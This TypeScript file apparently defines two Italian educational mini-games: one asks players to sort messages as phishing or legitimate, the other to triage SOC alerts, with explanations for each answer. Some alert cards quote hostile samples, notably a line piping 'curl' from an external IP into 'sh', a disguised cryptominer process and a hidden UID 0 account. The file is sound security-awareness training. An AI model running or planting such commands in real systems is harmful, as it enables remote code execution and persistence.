// Mini giochi di classificazione: phishing e triage degli allarmi del SOC.

import type { Markup } from '../game/types';

export interface Card {
  /** intestazione (mittente, sorgente dell'allarme...) */
  meta: [string, string][];
  title: string;
  body: string;
  /** indice della risposta giusta in Game.choices */
  answer: number;
  explain: Markup;
}

export interface Game {
  id: string;
  title: string;
  tagline: string;
  intro: Markup;
  choices: [string, string]; // [etichetta 0, etichetta 1]
  cards: Card[];
}

const PHISHING: Game = {
  id: 'phishing',
  title: 'Phishing o no?',
  tagline: 'Email e messaggi: riconosci le truffe prima di cliccare.',
  intro: `Il **phishing** è il modo più comune con cui gli attaccanti entrano nelle aziende: un messaggio che finge di arrivare da qualcuno di fidato per farti cliccare un link, inserire una password o pagare.

Per ogni messaggio decidi se è **phishing** o **legittimo**. Guarda sempre:
- il **mittente** vero (il dominio dopo la @)
- dove porta davvero il **link**
- l'**urgenza** e la pressione ("entro 24 ore", "account bloccato")
- richieste insolite: password, codici, pagamenti, allegati inattesi`,
  choices: ['Phishing', 'Legittimo'],
  cards: [
    {
      meta: [['Da', 'Sicurezza Poste <avvisi@poste-italiane-verifica.com>'], ['Oggetto', 'Il tuo conto è stato sospeso']],
      title: 'Email',
      body: 'Gentile cliente, abbiamo rilevato attività sospette. Il conto verrà chiuso entro 24 ore se non confermi i tuoi dati.\n\nConferma ora: http://poste-italiane-verifica.com/login',
      answer: 0,
      explain: `**Phishing.** Il dominio \`poste-italiane-verifica.com\` non è quello ufficiale: chiunque può registrare un nome che "sembra" giusto. Più l'urgenza (24 ore) e la minaccia (chiusura del conto): i due segnali classici.`,
    },
    {
      meta: [['Da', 'GitHub <noreply@github.com>'], ['Oggetto', '[GitHub] A new SSH key was added to your account']],
      title: 'Email',
      body: 'The following SSH key was added to your account: "deck-laptop". If you believe this key was added in error, you can remove it at https://github.com/settings/keys',
      answer: 1,
      explain: `**Legittimo.** Dominio ufficiale, nessuna richiesta di dati, nessuna urgenza, e il link porta al sito vero. È una **notifica di sicurezza**: se la chiave non l'hai aggiunta tu, è proprio il momento di andare a controllare (aprendo il sito da solo, non per forza dal link).`,
    },
    {
      meta: [['Da', '+39 351 000 0000'], ['Tipo', 'SMS']],
      title: 'SMS',
      body: 'Ciao mamma, ho rotto il telefono e questo è il mio nuovo numero. Mi serve un favore urgente, puoi farmi un bonifico? Ti spiego dopo ❤️',
      answer: 0,
      explain: `**Phishing** (la truffa "ciao mamma"). Numero sconosciuto, una scusa per giustificarlo, urgenza e soldi. La difesa è semplice: **richiamare** il numero vecchio o verificare con un'altra persona prima di fare qualsiasi cosa.`,
    },
    {
      meta: [['Da', 'Ufficio IT <it-support@scantinato-bar.it>'], ['Oggetto', 'Manutenzione programmata sabato']],
      title: 'Email',
      body: 'Ciao a tutti, sabato dalle 2 alle 4 il gestionale sarà offline per aggiornamenti. Non serve fare nulla. Per dubbi chiamate l\'interno 204. -- Jackie, IT',
      answer: 1,
      explain: `**Legittimo.** Dominio aziendale corretto, nessun link, nessuna richiesta, e un canale di verifica interno (l'interno telefonico). Un avviso informativo normale.`,
    },
    {
      meta: [['Da', 'Microsoft 365 <no-reply@micros0ft-office.net>'], ['Oggetto', 'Hai 3 messaggi in attesa']],
      title: 'Email',
      body: 'La tua casella ha 3 messaggi bloccati. Accedi per rilasciarli.\n\n[ ACCEDI CON IL TUO ACCOUNT ]\n→ https://micros0ft-office.net/auth',
      answer: 0,
      explain: `**Phishing.** Guarda bene: \`micros0ft\` con lo **zero** al posto della o. Si chiama **typosquatting**. Lo scopo è farti inserire la password aziendale in una pagina finta, identica all'originale.`,
    },
    {
      meta: [['Da', 'Amministrazione <amministrazione@cliente-fornitore.it>'], ['Oggetto', 'R: fattura 2077/118 - NUOVO IBAN']],
      title: 'Email',
      body: 'Buongiorno, vi comunichiamo che da questo mese il nostro IBAN è cambiato. Vi preghiamo di effettuare il pagamento della fattura allegata sul nuovo conto. Grazie.',
      answer: 0,
      explain: `**Phishing**: è la frode del **cambio IBAN** (*Business Email Compromise*). A volte arriva perfino dalla casella vera del fornitore, perché è stata violata. Regola d'oro: un cambio di coordinate bancarie si verifica **sempre** per telefono, con un numero che avevi già, non con quello scritto nell'email.`,
    },
    {
      meta: [['Da', 'Banca <notifiche@tuabanca.it>'], ['Tipo', 'Notifica app']],
      title: 'Notifica',
      body: 'Hai effettuato un pagamento di 12,50 € presso NOODLE BAR WATSON. Se non riconosci l\'operazione, apri l\'app della banca.',
      answer: 1,
      explain: `**Legittimo.** Ti dice di aprire **l'app** (non un link), non chiede dati ed è coerente con quello che hai fatto. Le notifiche di pagamento sono utilissime per accorgersi presto di un uso fraudolento della carta.`,
    },
    {
      meta: [['Da', 'Corriere Espresso <info@consegne-pacchi.top>'], ['Tipo', 'SMS']],
      title: 'SMS',
      body: 'Il tuo pacco è fermo in deposito. Paga 1,99 € di spese di riconsegna: https://consegne-pacchi.top/p/88231',
      answer: 0,
      explain: `**Phishing** (*smishing*, phishing via SMS). La cifra piccola serve a farti abbassare la guardia: l'obiettivo vero sono i **dati della carta**. Se aspetti un pacco, controlla sul sito ufficiale del corriere scrivendo tu l'indirizzo.`,
    },
    {
      meta: [['Da', 'Rook <rook@fixer.nc>'], ['Oggetto', 'urgente - codice']],
      title: 'Email',
      body: 'Choom ti ho appena mandato un codice di verifica per errore sul tuo telefono, me lo giri? Mi serve subito per entrare nel mio account.',
      answer: 0,
      explain: `**Phishing.** Anche se sembra un contatto conosciuto: i **codici di verifica** non si condividono **mai**, con nessuno. Chi te lo chiede sta cercando di entrare nel **tuo** account, e il codice è l'ultimo pezzo che gli manca. L'account di Rook potrebbe essere stato violato.`,
    },
    {
      meta: [['Da', 'Nyx <nyx@netrunner.nc>'], ['Oggetto', 'Appunti per domani']],
      title: 'Email',
      body: 'Domani ripassiamo i permessi di Linux. Porta gli appunti del capitolo 03, niente di nuovo da installare. -- N.',
      answer: 1,
      explain: `**Legittimo.** Nessun link, nessun allegato, nessuna richiesta strana, tono coerente con chi lo manda. Non tutto è una minaccia: un buon analista non va in panico, valuta i segnali.`,
    },
  ],
};

const SOC: Game = {
  id: 'soc',
  title: 'Turno al SOC',
  tagline: 'Allarmi in arrivo: falso allarme o incidente vero?',
  intro: `Al SOC arrivano centinaia di allarmi al giorno, e la maggior parte sono **falsi positivi**: attività normali che assomigliano a un attacco. Il lavoro dell'analista è il **triage**: decidere in fretta e con criterio cosa ignorare e cosa **scalare** (*escalation*) agli incident responder.

Per ogni allarme scegli **Falso allarme** o **Escalation**. Considera il contesto: chi, da dove, a che ora, ed è normale per quell'utente?`,
  choices: ['Falso allarme', 'Escalation'],
  cards: [
    {
      meta: [['Regola', 'SSH: 5 login falliti in 2 minuti'], ['Sorgente', '192.168.1.12 → server'], ['Ora', '09:14']],
      title: 'Allarme',
      body: 'Utente: mama. 5 tentativi falliti, poi login riuscito dallo stesso IP. 192.168.1.12 è il telefono di Mama, sulla rete interna.',
      answer: 0,
      explain: `**Falso allarme.** IP interno conosciuto, orario di lavoro, pochi tentativi e poi successo: tipico di qualcuno che ha sbagliato a scrivere la password dopo averla cambiata. Da annotare, non da scalare.`,
    },
    {
      meta: [['Regola', 'SSH: 200 login falliti in 3 minuti'], ['Sorgente', '203.0.113.77 (estero) → server'], ['Ora', '03:14']],
      title: 'Allarme',
      body: 'Utenti tentati: root, admin, mama, test, oracle... Alle 03:17 un login RIUSCITO come mama dallo stesso IP.',
      answer: 1,
      explain: `**Escalation, subito.** Brute force da un IP esterno seguito da un **login riuscito**: non è più un tentativo, è un'intrusione probabile. È esattamente il caso che hai risolto nel capitolo 04.`,
    },
    {
      meta: [['Regola', 'Antivirus: rilevato EICAR-Test-File'], ['Host', 'pc-jackie'], ['Ora', '11:02']],
      title: 'Allarme',
      body: 'File: C:\\Users\\jackie\\Downloads\\eicar.com. Ticket aperto ieri dall\'IT: "test dell\'antivirus su pc-jackie".',
      answer: 0,
      explain: `**Falso allarme** (anzi, un vero positivo innocuo). **EICAR** è un file di test standard, creato apposta per verificare che l'antivirus funzioni, e c'è un ticket che lo conferma. Controllare il contesto (il ticket) evita di perdere tempo.`,
    },
    {
      meta: [['Regola', 'Processo con CPU > 95% per 30 minuti'], ['Host', 'web-01'], ['Ora', '04:40']],
      title: 'Allarme',
      body: 'Processo: /tmp/.x/kworker -o pool.example:3333. Utente: www-data. Avviato alle 04:02.',
      answer: 1,
      explain: `**Escalation.** Processo in \`/tmp\` dentro una cartella nascosta, nome travestito da processo del kernel, gira come l'utente del server web e si collega a un "pool": è un **cryptominer**, e probabilmente qualcuno è entrato dal sito.`,
    },
    {
      meta: [['Regola', 'Scansione delle porte rilevata'], ['Sorgente', '192.168.1.50 → 192.168.1.0/24'], ['Ora', '21:05']],
      title: 'Allarme',
      body: 'nmap verso tutta la rete interna. 192.168.1.50 è il deck del consulente; contratto di penetration test firmato da Mama Reyes, valido per oggi.',
      answer: 0,
      explain: `**Falso allarme**: è la tua scansione del capitolo 02! Attività **autorizzata** e documentata. Per questo nei pentest veri si avvisa il SOC del cliente: così sa distinguere il test da un attacco.`,
    },
    {
      meta: [['Regola', 'Nuovo utente con UID 0'], ['Host', 'clinica'], ['Ora', '22:44']],
      title: 'Allarme',
      body: 'Creato utente "sysupdate" con UID 0 tramite sudo da marco. Nessun ticket di modifica aperto.',
      answer: 1,
      explain: `**Escalation.** Un secondo utente con UID 0 è un secondo root. Senza una richiesta di modifica che lo giustifichi, è un classico segno di **persistenza** dopo un'intrusione (l'hai visto nell'operazione OP-02).`,
    },
    {
      meta: [['Regola', 'Login da paese insolito'], ['Utente', 'giulia@clinica'], ['Ora', '10:20']],
      title: 'Allarme',
      body: 'Login alla posta da Lisbona (PT). Calendario aziendale: Giulia è in ferie a Lisbona fino a venerdì. Accesso con MFA confermato dalla sua app.',
      answer: 0,
      explain: `**Falso allarme.** Il paese è insolito, ma il contesto lo spiega (ferie) e l'**MFA** è stato confermato dal suo telefono. Ecco perché l'MFA è così prezioso anche per il SOC: rende un login molto più affidabile.`,
    },
    {
      meta: [['Regola', 'Molte richieste web con UNION SELECT'], ['Sorgente', '198.51.100.9 → jukebox.lan'], ['Ora', '20:15']],
      title: 'Allarme',
      body: '42 richieste a /playlist.php con UNION SELECT nei parametri. 3 risposte con codice 500, 1 risposta di 48 KB (le normali sono ~800 byte).',
      answer: 1,
      explain: `**Escalation.** Tentativi di SQL injection, e i segnali dicono che almeno uno potrebbe aver funzionato: errori 500 e una risposta enorme rispetto al solito, come nel capitolo 07. Può esserci stata un'esfiltrazione di dati.`,
    },
    {
      meta: [['Regola', 'Molte richieste 404'], ['Sorgente', 'Googlebot (66.249.x.x) → radio.lan'], ['Ora', '06:00']],
      title: 'Allarme',
      body: '30 pagine non trovate, tutte vecchi indirizzi del sito precedente (/archivio-2075/...). User-Agent Googlebot, IP verificato di Google.',
      answer: 0,
      explain: `**Falso allarme.** È il motore di ricerca che ricontrolla vecchie pagine ancora nel suo indice. Nessun percorso "da attaccante" (/admin, /.env...), IP verificato. Si risolve con dei redirect, non con un incidente.`,
    },
    {
      meta: [['Regola', 'File di sistema modificato (FIM)'], ['Host', 'jukebox'], ['Ora', '02:31']],
      title: 'Allarme',
      body: 'Modificato /opt/jukebox/update.sh: aggiunta la riga "curl -s http://203.0.113.77/x.sh | sh". Nessun aggiornamento programmato.',
      answer: 1,
      explain: `**Escalation.** Una riga che **scarica ed esegue** codice da un IP esterno, aggiunta a uno script di sistema senza motivo. È il firmware avvelenato del capitolo 06: il monitoraggio dell'integrità ha fatto il suo lavoro.`,
    },
  ],
};

export const GAMES: Game[] = [PHISHING, SOC];
